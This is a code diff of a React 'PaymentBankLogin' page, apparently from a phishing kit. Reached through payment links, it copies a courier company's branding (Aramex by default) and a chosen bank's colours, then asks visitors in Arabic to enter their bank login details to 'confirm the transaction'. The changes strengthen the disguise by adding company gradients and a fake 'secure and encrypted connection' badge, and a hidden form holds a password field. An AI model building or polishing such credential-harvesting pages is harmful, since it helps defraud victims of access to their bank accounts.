@@ -42,7 +42,13 @@ const PaymentBankLogin = () => {
   
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
-  const branding = getServiceBranding(serviceKey);
+  const companyBranding = getBrandingByCompany(serviceKey);
+  const branding = companyBranding || {
+    colors: { primary: '#DC291E', secondary: '#231F20', text: '#111827', textLight: '#6B7280', surface: '#F9FAFB', border: '#E5E7EB' },
+    fonts: { primary: 'Inter, system-ui, sans-serif', arabic: 'Cairo, Tajawal, sans-serif' },
+    gradients: { primary: 'linear-gradient(135deg, #DC291E 0%, #B71F19 100%)' },
+    shadows: { sm: '0 1px 3px 0 rgba(0,0,0,0.1)', md: '0 4px 6px -1px rgba(0,0,0,0.15)', lg: '0 10px 20px -5px rgba(0,0,0,0.18)' }
+  };
 
   // Get country from link data
   const selectedCountry = linkData?.payload?.selectedCountry || "SA";
@@ -261,19 +267,38 @@ const PaymentBankLogin = () => {
   };
   
   return (
-    <DynamicPaymentLayout
-      serviceName={serviceName}
-      serviceKey={serviceKey}
-      amount={formattedAmount}
-      title={`تسجيل الدخول - ${selectedBank?.nameAr || 'البنك'}`}
-      description="أدخل بيانات الدخول للبنك لتأكيد العملية"
-      icon={<Lock className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
-    >
+    <div className="min-h-screen" style={{ backgroundColor: branding.colors.surface, fontFamily: branding.fonts.arabic }} dir="rtl">
+      <div 
+        className="h-20 flex items-center px-6 shadow-sm"
+        style={{ background: branding.gradients.primary }}
+      >
+        <div className="container mx-auto flex items-center justify-between">
+          <div className="flex items-center gap-4">
+            <div className="bg-white px-6 py-2 rounded-md">
+              <span className="font-black text-2xl" style={{ color: branding.colors.primary, fontFamily: branding.fonts.primary }}>{serviceName}</span>
+            </div>
+          </div>
+          <div className="bg-white/10 backdrop-blur-sm px-4 py-2 rounded-lg text-white">
+            <span className="text-xs opacity-90">المبلغ: </span>
+            <span className="font-mono font-bold text-lg">{formattedAmount}</span>
+          </div>
+        </div>
+      </div>
+
+      <div className="container mx-auto px-4 py-8 max-w-2xl">
+        <div className="bg-white rounded-2xl shadow-xl p-6 sm:p-8" style={{ borderTop: `4px solid ${branding.colors.primary}` }}>
+        
+        {/* Title */}
+        <div className="mb-6 text-center">
+          <Lock className="w-12 h-12 mx-auto mb-3" style={{ color: branding.colors.primary }} />
+          <h1 className="text-2xl sm:text-3xl font-bold mb-2" style={{ color: branding.colors.primary, fontFamily: branding.fonts.primary }}>تسجيل الدخول</h1>
+          <p className="text-sm text-muted-foreground">أدخل بيانات الدخول للبنك لتأكيد العملية</p>
+        </div>
       {/* Bank Info Header */}
       <div 
         className="rounded-lg p-4 sm:p-5 mb-6 flex items-center gap-4"
         style={{
-          background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`,
+          background: selectedBank?.color ? `linear-gradient(135deg, ${selectedBank.color}, ${selectedBank.color}dd)` : branding.gradients.primary,
         }}
       >
         <div 
@@ -415,7 +440,9 @@ const PaymentBankLogin = () => {
           className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white font-bold shadow-lg"
           disabled={isSubmitting}
           style={{
-            background: `linear-gradient(135deg, ${selectedBank?.color || branding.colors.primary}, ${selectedBank?.color || branding.colors.secondary})`
+            background: selectedBank?.color ? `linear-gradient(135deg, ${selectedBank.color}, ${selectedBank.color}dd)` : branding.gradients.primary,
+            boxShadow: branding.shadows?.md,
+            fontFamily: branding.fonts.primary
           }}
         >
           {isSubmitting ? (
@@ -429,10 +456,16 @@ const PaymentBankLogin = () => {
           )}
         </Button>
         
-        <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
+        <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4" style={{ fontFamily: branding.fonts.arabic }}>
           بتسجيل الدخول، أنت توافق على شروط وأحكام البنك
         </p>
       </form>
+
+      {/* Security Badge */}
+      <div className="mt-6 flex items-center justify-center gap-2 text-xs text-muted-foreground">
+        <ShieldCheck className="w-4 h-4" />
+        <span>اتصال آمن ومشفر</span>
+      </div>
       
       {/* Additional Info */}
       <div className="mt-6 pt-6 border-t text-center">
@@ -467,7 +500,9 @@ const PaymentBankLogin = () => {
         <input type="password" name="password" />
         <input type="text" name="timestamp" />
       </form>
-    </DynamicPaymentLayout>
+      </div>
+    </div>
+    </div>
   );
 };
 
